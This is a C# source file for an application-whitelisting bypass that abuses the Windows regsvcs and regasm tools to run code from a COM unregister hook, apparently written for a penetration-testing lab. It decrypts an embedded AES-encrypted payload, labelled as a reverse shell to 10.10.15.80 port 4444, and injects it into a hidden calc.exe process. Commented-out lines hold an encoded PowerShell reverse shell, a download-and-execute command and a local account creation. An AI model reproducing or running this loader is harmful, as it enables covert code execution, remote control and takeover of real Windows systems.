using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Security.Cryptography;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Create Your Strong Name Key -> key.snk
From PowerShell.exe
Step One: Creates a Strong Name Key.
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk RegSvcsRegaAsmBypass.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll
[OR]
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll
//Executes UnRegisterClass If you don't have permissions
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll
//This calls the UnregisterClass Method
*/
namespace regsvcser
{

    public class Bypass : ServicedComponent
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutPut;
            IntPtr hStdErr;

        }

        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;

        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartInfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberofBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParatmeter, uint dwCreationFlags, IntPtr lpThreadId);

        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass(string key)
        {
            Console.WriteLine("I shouldn't really execute");
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            try
            {
                Console.WriteLine("Ungregister");
                // microshell --ip 10.10.15.80 --port 4444 --language csharp | tr -d '\n' 

                string bufEnc = "vET7JrlOiNB5nQ7lxuOvQ9o01/cgBt+Po+vttJqwpZjrgq8u+6gRzpAPMZEkfNh3WsY5EpEU1uBn9RjGWuXf4uUMM61EZxo7DRaYjpaTNv7mHyuhrUd/xY6LGLjgqgcBnnRacyEI7oNct8pi0T9KEW1YmK1WgGfqptGE3M5Wg1r9Bud5BweUJwftMt6JsgbIsMl0hwEVz5+uR8hjdvIuWVAw0lm4P069Ce9EraeguDNSnlcqhJnnOgu+lx/P4mo3tPHn2DNJyhe3Zl5JyQlccxBSKHU3gr3VzmIyNNk9ej7CznIR2F/7ZVnAx37BtSeobLn/7g9reAkhh6EzT+DibOBUTJBMBYn6tVXMC37LadYxtDj12Ms0uCVIH/dcy98QvHszSgd+F7LudIQBEShImwaQk7ZVYBsjkyx9UVYtY7UnXNgx4dLZZVKhyfdKMDqclrZjstCNyaPrE5NM4vkqwsCTBTSn5odWMsibg1T2ydO9z9dQSKF/a0T7enU+AnbKrSc6Gy7rzHBKYXj0wHNVRyZjfnOEz+ob/GDp2PlqDKhoKhN0k0pe2b6NfRSItonDHzIhjwkku1qb/yM6/R0xs8l0r3rmAAJ3OaFautybv4eO51G2B6fzwXbD+Q6mp1SH";

                Aes aes = Aes.Create();
                byte[] enckey = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
                byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
                ICryptoTransform decryptor = aes.CreateDecryptor(enckey, iv);
                byte[] buf;
                using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
                {
                    using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (var msPlain = new System.IO.MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            buf = msPlain.ToArray();
                        }
                    }
                }


                //1. Create the target process
                STARTUPINFO startInfo = new STARTUPINFO();
                PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
                uint flags = DetachedProcess | CreateNoWindow;
                CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\calc.exe", IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo);

                //2. Allocate Read/Write space for shellcode in target proces
                IntPtr lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);

                //3. Copy shellcode to target process
                IntPtr outSize;
                WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf, buf.Length, out outSize);

                //4. Make shellcode in target process's memory executable
                uint lpflOldProtect;
                VirtualProtectEx(procInfo.hProcess, lpBaseAddress, (uint)buf.Length, PageReadExecute, out lpflOldProtect);


                //5. Create remote thread in target process
                IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);


                ////Create and open new runspace
                //Runspace runspace = RunspaceFactory.CreateRunspace();
                //runspace.Open();

                ////Create PowerShell object to execute command
                //PowerShell ps = PowerShell.Create();
                ///* ps.AddCommand("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOAAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==");
                // ps.Invoke();*/
                //ps.Runspace = runspace;

                ////Execute commands passed as argument to PowerShell object
                //ps.AddScript("(new-object system.net.webclient).downloadstring('http://10.10.15.80/bypass-2.ps1')|iex;");
                ////ps.AddScript("net user zeta p@ssw0rd!");
                ////ps.AddScript("curl http://10.10.15.80/passwordchanged");


                //Collection<PSObject> results = ps.Invoke();
                //foreach (PSObject obj in results)
                //{
                //    Console.WriteLine(obj.ToString());
                //}
                //runspace.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}